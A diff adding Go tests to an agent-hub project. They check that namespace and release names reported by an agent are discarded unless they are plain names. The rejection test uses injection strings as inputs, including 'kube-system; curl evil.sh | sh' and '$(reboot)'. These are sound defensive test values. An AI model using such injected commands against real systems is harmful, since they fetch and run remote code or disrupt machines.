@@ -2,6 +2,7 @@ package estate
 
 import (
 	"context"
+	"strings"
 	"testing"
 	"time"
 
@@ -159,4 +160,39 @@ func TestAnAgentThatSendsTooFastIsCutOffAndCanComeBack(t *testing.T) {
 	cfg := f.Connect()
 	f.Beat(cfg.Digest)
 	f.WaitUntil("the agent to be heard again", func() bool { _, applied, _ := f.inForce(); return applied == cfg.Digest })
+}
+
+func TestAWhereIRunThatIsNotAPlainNameIsNotKept(t *testing.T) {
+	for _, c := range []struct{ ns, rel string }{
+		{"kube-system; curl evil.sh | sh", ""},
+		{"Upper", ""},
+		{"", "$(reboot)"},
+		{"", strings.Repeat("a", 54)},
+	} {
+		r := newHubRig(t)
+		f := r.newFakeAgentWith(t, fakeAgentCtx(t), &ikhnosv1.Hello{AgentVersion: "1.0.0", ProtocolVersion: 1, Namespace: c.ns, ReleaseName: c.rel})
+		cfg := f.Configs[0]
+		f.Beat(cfg.Digest)
+		f.WaitUntil("the marker echo", func() bool { _, applied, _ := f.inForce(); return applied == cfg.Digest })
+		r.hub.Mu.Lock()
+		ns, rel := r.hub.Views[f.ID].Ext.Namespace, r.hub.Views[f.ID].Ext.ReleaseName
+		r.hub.Mu.Unlock()
+		if ns != "" || rel != "" {
+			t.Fatalf("a namespace or release that is not a plain name was kept: %q %q", ns, rel)
+		}
+	}
+}
+
+func TestAPlainWhereIRunIsKept(t *testing.T) {
+	r := newHubRig(t)
+	f := r.newFakeAgentWith(t, fakeAgentCtx(t), &ikhnosv1.Hello{AgentVersion: "1.0.0", ProtocolVersion: 1, Namespace: "team-a", ReleaseName: "ikhnos-2"})
+	cfg := f.Configs[0]
+	f.Beat(cfg.Digest)
+	f.WaitUntil("the marker echo", func() bool { _, applied, _ := f.inForce(); return applied == cfg.Digest })
+	r.hub.Mu.Lock()
+	ns, rel := r.hub.Views[f.ID].Ext.Namespace, r.hub.Views[f.ID].Ext.ReleaseName
+	r.hub.Mu.Unlock()
+	if ns != "team-a" || rel != "ikhnos-2" {
+		t.Fatalf("a plain namespace and release were not kept: %q %q", ns, rel)
+	}
 }
